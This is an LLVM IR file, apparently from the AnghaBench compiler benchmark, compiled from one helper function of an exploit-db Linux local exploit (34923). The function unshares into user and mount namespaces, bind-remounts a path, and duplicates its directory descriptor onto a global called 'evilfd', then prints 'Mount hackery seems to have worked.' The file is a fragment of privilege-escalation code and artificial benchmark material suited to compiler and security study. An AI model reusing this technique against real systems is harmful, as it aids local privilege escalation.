; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_34923.c_child2.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_34923.c_child2.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@CLONE_NEWUSER = common dso_local global i32 0, align 4
@CLONE_NEWNS = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [8 x i8] c"unshare\00", align 1
@MS_REMOUNT = common dso_local global i32 0, align 4
@MS_BIND = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [6 x i8] c"mount\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@O_DIRECTORY = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [5 x i8] c"open\00", align 1
@evilfd = common dso_local global i32 0, align 4
@O_CLOEXEC = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [5 x i8] c"dup3\00", align 1
@.str.4 = private unnamed_addr constant [37 x i8] c"Mount hackery seems to have worked.\0A\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 (i8*)* @child2 to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @child2(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  store i8* %5, i8** %3, align 8
  %6 = load i32, i32* @CLONE_NEWUSER, align 4
  %7 = load i32, i32* @CLONE_NEWNS, align 4
  %8 = or i32 %6, %7
  %9 = call i64 @unshare(i32 %8)
  %10 = icmp ne i64 %9, 0
  br i1 %10, label %11, label %13

11:                                               ; preds = %1
  %12 = call i32 @err(i32 1, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0))
  br label %13

13:                                               ; preds = %11, %1
  %14 = load i8*, i8** %3, align 8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* @MS_REMOUNT, align 4
  %17 = load i32, i32* @MS_BIND, align 4
  %18 = or i32 %16, %17
  %19 = call i64 @mount(i8* %14, i8* %15, i32* null, i32 %18, i32* null)
  %20 = icmp slt i64 %19, 0
  br i1 %20, label %21, label %23

21:                                               ; preds = %13
  %22 = call i32 @err(i32 1, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0))
  br label %23

23:                                               ; preds = %21, %13
  %24 = load i8*, i8** %3, align 8
  %25 = load i32, i32* @O_RDONLY, align 4
  %26 = load i32, i32* @O_DIRECTORY, align 4
  %27 = or i32 %25, %26
  %28 = call i32 @open(i8* %24, i32 %27)
  store i32 %28, i32* %4, align 4
  %29 = load i32, i32* %4, align 4
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %31, label %33

31:                                               ; preds = %23
  %32 = call i32 @err(i32 1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0))
  br label %33

33:                                               ; preds = %31, %23
  %34 = load i32, i32* %4, align 4
  %35 = load i32, i32* @evilfd, align 4
  %36 = load i32, i32* @O_CLOEXEC, align 4
  %37 = call i32 @dup3(i32 %34, i32 %35, i32 %36)
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %41

39:                                               ; preds = %33
  %40 = call i32 @err(i32 1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  br label %41

41:                                               ; preds = %39, %33
  %42 = load i32, i32* %4, align 4
  %43 = call i32 @close(i32 %42)
  %44 = call i32 @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.4, i64 0, i64 0))
  %45 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i64 @unshare(i32) #1

declare dso_local i32 @err(i32, i8*) #1

declare dso_local i64 @mount(i8*, i8*, i32*, i32, i32*) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @dup3(i32, i32, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @printf(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
